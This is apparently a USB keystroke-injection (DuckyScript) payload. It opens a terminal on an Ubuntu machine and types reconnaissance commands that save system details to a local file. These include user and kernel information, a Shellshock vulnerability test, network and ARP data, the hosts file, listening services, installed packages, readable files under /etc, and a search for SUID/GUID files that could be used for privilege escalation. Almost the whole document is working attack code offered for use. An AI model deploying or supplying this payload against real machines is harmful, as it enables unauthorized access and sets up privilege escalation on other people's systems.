The following script is an information gatherer script which collects info from a running Ubuntu OS and saves it to a file named "info_gathering.txt". 
The info that the script retrieves is the following:
- Logged in Username
- Distribution and kernel version of running system
- Applicability of Shellsock Bug Vulnerability
- Mounted Filesystem
- Network Adapters info
- Availability of Development tools (python, g++ etc)
- Printing of hosts file
- Printing of TCP/UDP Listening Servic


    REM Infogathering Ubuntu 1.0 Script issues OS info gathering commands in terminal - by Captain_Harlock
    DELAY 3000
    ALT F2
    DELAY 300
    STRING gnome-terminal 
    DELAY 100
    ENTER
    DELAY 200
    STRING clear
    DELAY 10
    ENTER
    DELAY 50
    STRING echo "Logged in user:" $USER > info_gathering.txt
    ENTER 
    DELAY 50
    STRING echo >> info_gathering.txt
    DELAY 50
    ENTER 
    DELAY 50
    STRING echo -n "Distribution Kernel Version:" >> info_gathering.txt
    DELAY 50
    ENTER 
    DELAY 50
    STRING cat /etc/issue | cut -c1-13 >> info_gathering.txt
    DELAY 50
    ENTER
    DELAY 50 
    STRING echo -n "uname results: " >> info_gathering.txt
    DELAY 50
    ENTER 
    DELAY 50
    STRING uname -a >> info_gathering.txt
    DELAY 50
    ENTER 
    DELAY 50
    DELAY 50
    STRING echo >> info_gathering.txt
    DELAY 50
    ENTER 
    DELAY 50
    STRING echo "Shellsock Bug Vulnerability" >> info_gathering.txt
    DELAY 50
    ENTER 
    STRING echo >> info_gathering.txt
    ENTER 
    DELAY 50
    STRING env x='() { :;}; echo vulnerable' bash -c `echo hello` >> info_gathering.txt
    DELAY 50
    ENTER 
    DELAY 50
    DELAY 50
    ENTER 
    DELAY 50
    STRING echo >> info_gathering.txt
    DELAY 50
    ENTER 
    DELAY 50
    STRING echo "Mounted filesystems" >> info_gathering.txt
    ENTER 
    DELAY 50
    STRING mount -l >> info_gathering.txt
    DELAY 50
    ENTER
    DELAY 100
    STRING echo >> info_gathering.txt
    ENTER
    DELAY 50  
    STRING echo "Network Configuration" >> info_gathering.txt
    DELAY 50
    ENTER
    DELAY 50
    STRING ifconfig -a | grep 'Link\|inet' >> info_gathering.txt
    ENTER
    DELAY 50
    STRING 
    STRING echo >> info_gathering.txt
    ENTER
    DELAY 50
    STRING echo "Print Hosts" >> info_gathering.txt
    ENTER
    DELAY 50
    STRING cat /etc/hosts >> info_gathering.txt
    ENTER
    DELAY 50
    STRING 
    STRING echo echo "Print ARP" >> info_gathering.txt
    ENTER
    DELAY 50  
    STRING arp >> info_gathering.txt
    ENTER
    DELAY 50 
    STRING echo >> info_gathering.txt
    ENTER
    DELAY 50
    STRING echo "Development tools availability" >> info_gathering.txt
    ENTER
    DELAY 50
    STRING which gcc >> info_gathering.txt
    ENTER
    DELAY 50
    STRING which g++ >> info_gathering.txt
    ENTER
    DELAY 50
    STRING which python >> info_gathering.txt
    ENTER
    DELAY 50
    STRING echo >> info_gathering.txt
    ENTER
    DELAY 50
    STRING echo "Print TCP/UDP Listening Services" >> info_gathering.txt
    ENTER
    DELAY 50
    STRING netstat -tunlpe >> info_gathering.txt
    ENTER
    DELAY 300
    STRING echo >> info_gathering.txt
    ENTER
    DELAY 50
    STRING echo "Installed Packages" >> info_gathering.txt
    DELAY 50
    ENTER
    DELAY 200
    STRING dpkg -l >> info_gathering.txt
    ENTER
    DELAY 300
    STRING echo >> info_gathering.txt
    ENTER
    DELAY 50
    STRING echo "Find Readable Folders in /etc" >> info_gathering.txt
    ENTER
    DELAY 50
    STRING find /etc -user `id -u` -perm -u=r -o -group `id -g` -perm -g=r -o -perm -o=r -ls 2> /dev/null >> info_gathering.txt
    ENTER
    DELAY 500
    STRING echo >> info_gathering.txt
    ENTER
    DELAY 50
    STRING echo "Find SUID and GUID files" >> info_gathering.txt
    ENTER
    DELAY 50
    STRING find / -type f -perm -u=s -o -type f -perm -g=s -ls  2> /dev/null >> info_gathering.txt
    DELAY 50
    ENTER